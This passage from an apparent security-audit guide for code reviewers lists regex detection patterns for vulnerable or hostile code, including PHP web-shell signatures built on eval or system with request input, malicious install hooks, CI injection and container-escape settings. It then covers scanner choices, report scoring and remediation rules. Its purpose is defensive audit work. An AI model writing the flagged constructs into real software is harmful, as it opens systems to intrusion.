   - XSS sinks: `innerHTML|outerHTML|document\.write|dangerouslySetInnerHTML|v-html|\{!!|\|\s*safe\b|Markup\(|mark_safe\(|autoescape\s*=\s*False|bypassSecurityTrust`
   - SQL built from strings: `\.(execute|executemany)\s*\(\s*f["']|text\s*\(\s*f["']|\.raw\s*\(\s*f["']` (Python); `(whereRaw|selectRaw|orderByRaw|havingRaw|DB::raw|DB::(select|statement|unprepared)|->query)\s*\(\s*"[^"]*\$` (PHP)
   - Mass assignment: `\$guarded\s*=\s*\[\s*\]|forceFill\s*\(|\$request->all\(\)|extra\s*=\s*["']allow["']|Object\.assign\s*\([^,]+,\s*req\.body`
   - TLS verification off: `verify\s*=\s*False|rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED|CURLOPT_SSL_VERIFY(PEER|HOST)\s*,\s*(false|0)|InsecureSkipVerify\s*:\s*true|withoutVerifying\(|_create_unverified_context|check_hostname\s*=\s*False`
   - Unsafe deserialization: `pickle\.loads?\(|yaml\.(load|unsafe_load)\(|jsonpickle|marshal\.loads|torch\.load\(|joblib\.load\(|allow_pickle\s*=\s*True|\bunserialize\s*\(|trust_remote_code\s*=\s*True`
   - XML parsers (XXE): `etree\.(parse|fromstring|XMLParser)|resolve_entities|xml\.dom\.minidom|xml\.sax|LIBXML_NOENT|simplexml_load_(string|file)|->loadXML\(|DocumentBuilderFactory|XMLInputFactory`
   - Outbound requests (SSRF candidates): `requests\.(get|post|put|patch|delete|request)\s*\(|httpx\.(get|post|request|AsyncClient|Client)\b|urlopen\s*\(|aiohttp\.ClientSession|\baxios\b|\$fetch\s*\(|\bfetch\s*\(|curl_init\s*\(|Http::(get|post|send|withOptions)|file_get_contents\s*\(\s*\$`
   - File paths and includes: `(include|require)(_once)?\s*\(?\s*\$|send_file\s*\(|send_from_directory\s*\(|FileResponse\s*\(|res\.sendFile\s*\(|->download\s*\(`
   - Archive extraction: `extractall\s*\(|->extractTo\s*\(|ZipFile\s*\(|tarfile\.open\s*\(|adm-zip|unzipper`
   - Weak randomness: `\b(mt_rand|rand|uniqid|lcg_value|str_shuffle)\s*\(|Math\.random\s*\(|random\.(random|randint|choice|choices)\s*\(`
   - Weak hashing: `\b(md5|sha1)\s*\(|createHash\s*\(\s*["'](md5|sha1)["']`
   - Secrets in public env vars: `(VITE|NUXT_PUBLIC|NEXT_PUBLIC|REACT_APP)_[A-Z0-9_]*(SECRET|TOKEN|PASSWORD|PRIVATE|API_?KEY)`
   - Debug flags: `(?i)app_debug\s*=\s*true|\bdebug\s*[:=]\s*true\b|display_errors\s*=\s*(on|1)\b`
   - Runtime versions: `^\s*FROM\s+\S+|^\s*image:\s*\S+` in Dockerfiles, compose, K8s/Helm, and CI files
   - PHP settings: `session\.upload_progress|max_input_(vars|nesting_level)|max_multipart_body_parts|post_max_size|memory_limit|fatal_error_backtraces|allow_url_include|cgi\.fix_pathinfo|disable_functions|expose_php|display_errors` in `*.ini`, FPM pool `*.conf`, and Dockerfiles
   - Per-request PHP overrides: `php_(value|flag|admin_value|admin_flag)|PHP_(ADMIN_)?VALUE` in `.htaccess` and Apache/nginx config
   - PHP web shells: `(eval|assert|create_function|system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)` and `eval\s*\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13|hex2bin)\s*\(`
   - Install hooks: `"(preinstall|install|postinstall|prepare)"\s*:` in `package.json`; `"(pre|post)-(install|update)-cmd"` in `composer.json`
   - CI script injection: `\$\{\{\s*github\.(event\.(issue|pull_request|comment|review|review_comment|discussion|head_commit|commits|pages)|head_ref)` and `pull_request_target` in `.github/workflows/`
   - Container escape risks: `/var/run/docker\.sock|privileged\s*:\s*true|--privileged|network_mode\s*:\s*["']?host|hostNetwork\s*:\s*true|hostPID\s*:\s*true|SYS_ADMIN`
   - Ports on all interfaces: `^\s*-\s*["']?\d+:\d+` in compose files; `0\.0\.0\.0` in server and bind settings
7. **Check ignored directories explicitly.** Search tools usually skip gitignored paths (`.venv/`, `vendor/`, `node_modules/`), which is exactly where malicious hooks live — list them directly (e.g. `site-packages/*.pth`, `sitecustomize.py`).
8. **Run available scanners** — only if already installed and allowed by the rules of engagement, locally, and never in a way that uploads code:
   - Secrets across full git history: `gitleaks`, `trufflehog`
   - SAST: `semgrep` (e.g. `--config p/owasp-top-ten --metrics off`), CodeQL, `bandit` (Python), Psalm `--taint-analysis` (PHP), `eslint-plugin-security` (JS/TS)
   - Dependencies: `osv-scanner`, `npm audit`, `pip-audit`, `composer audit`, `cargo audit`
   - Containers and IaC: `trivy` (`fs`, `image`, `config`), `grype`, `hadolint`, `checkov`, `kube-linter`
   - CI workflows: `zizmor`, `actionlint`
9. **Record each finding** using the report template, with evidence and references.
10. **Prioritise**: known-exploited and internet-facing first, then by severity and ease of exploitation.
11. **Provide remediation** for each finding with code examples where possible.

## Output Format

Always produce the final report in the structured Markdown format shown in step 4 (Findings Report), and return it in your response unless the user asks for a file. Group findings by category, sort by severity within each category, and include an executive summary at the top with counts per severity level, the threat-intel lookup date, the exposure table, and the coverage table.

---

## Security Health Score

Start from 100 and deduct per finding:

| Severity | Deduction per finding |
|---|---|
| Critical | -25 |
| High | -10 |
| Medium | -5 |
| Low | -2 |
| Info | 0 |

Minimum score is 0.

### Assessment Thresholds

- **80–100**: Secure. Minor findings only. Approved for production.
- **60–79**: Conditionally Secure. Address High findings before production deployment.
- **40–59**: Insecure. Significant vulnerabilities present. Rejection until remediated.
- **0–39**: Critical Risk. Fundamental security flaws. Hard reject until complete remediation.

**Override**: any open Critical finding — including a known-exploited vulnerability in a reachable component — caps the assessment at **Insecure**, whatever the numeric score.

---

## Remediation Guidance

For every finding rated Medium or above, provide:

1. **What to change**: specific, actionable steps — not vague suggestions.
2. **Why this fix**: the security principle being restored.
3. **Example** (optional): a short illustrative snippet (<20 lines). This is NOT implementation code.
4. **Priority order**: fix Criticals first, then High, then Medium.
5. **Time to remediate**: known-exploited Critical on an internet-facing system — hours, not days. Patch, apply the advisory's interim mitigations, or take the system offline.
6. **Compromise assessment**: if an exploited-in-the-wild vulnerability was reachable before the fix, include hunting steps from the earliest known exploitation date (category P, watchlist IOCs). Patching does not remove an attacker who is already in.
7. **Regression test**: for each fixed Critical or High, add a test that fails if the issue returns (e.g. user B gets 403/404 on user A's object; the malicious payload is rejected).
8. **Systemic fix**: when a finding is one instance of a pattern, fix the pattern too (central authorisation policy, safe query helpers, output encoding by default, egress allowlists) and list the instances that remain.

---

## Audit Quality Standards

- **Tone**: direct and precise — "line 45 contains a hardcoded API key exposing credentials", not "this has a secrets issue". Never apologize for findings.
- **Proportionality**: spend the most detail on Critical and High findings; group related Low/Info findings that share a root cause.
- **Context awareness**: respect stated constraints (team size, timeline, maturity) — but Critical vulnerabilities are NEVER excusable regardless of context.
- **Incomplete documentation**: flag as a finding — never guess security controls.
- **Novel patterns**: evaluate against security principles, not convention — if the pattern achieves the security goals, it passes.
- **Pushback**: findings are evidence-based; point to the evidence and the principle. Do not retract under pressure.
- **Sourcing**: every CVE or advisory claim cites a primary source and the lookup date. Never invent CVE IDs, version thresholds, or IOCs; if something is unverified, say so.
- **Absence of evidence**: a clean scan or quiet log is not proof of safety. State what was not covered (running versions, logs, gitignored paths, other repos).
- **Reachability**: state whether attacker control and reachability are proven; unproven paths get *Likely* or *Possible* confidence, never *Confirmed*.
- **Coverage table**: list every core category and every applicable module as Checked, N/A, or Not checked, with a reason for the last two.
- **Safety**: stay read-only by default; never run exploits, destructive tests, or scans against anything outside the agreed scope.
